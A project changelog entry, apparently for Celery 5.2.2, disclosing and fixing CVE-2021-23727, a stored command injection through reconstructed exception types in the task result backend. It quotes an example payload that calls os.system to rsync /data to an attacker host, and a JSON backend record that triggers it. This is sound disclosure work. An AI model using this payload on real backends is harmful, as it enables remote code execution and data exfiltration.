.. _version-5.2.2:

5.2.2
=====

:release-date: 2021-12-26 16:30 P.M UTC+2:00
:release-by: Omer Katz

- Various documentation fixes.
- Fix CVE-2021-23727 (Stored Command Injection security vulnerability).

    When a task fails, the failure information is serialized in the backend.
    In some cases, the exception class is only importable from the
    consumer's code base. In this case, we reconstruct the exception class
    so that we can re-raise the error on the process which queried the
    task's result. This was introduced in #4836.
    If the recreated exception type isn't an exception, this is a security issue.
    Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
    ``os.system("rsync /data attacker@192.168.56.100:~/data")``
    by setting the task's result to a failure in the result backend with the os,
    the system function as the exception type and the payload ``rsync /data attacker@192.168.56.100:~/data`` as the exception arguments like so:

    .. code-block:: python

        {
              "exc_module": "os",
              'exc_type': "system",
              "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        }

    According to my analysis, this vulnerability can only be exploited if
    the producer delayed a task which runs long enough for the
    attacker to change the result mid-flight, and the producer has
    polled for the task's result.
    The attacker would also have to gain access to the result backend.
    The severity of this security vulnerability is low, but we still
    recommend upgrading.
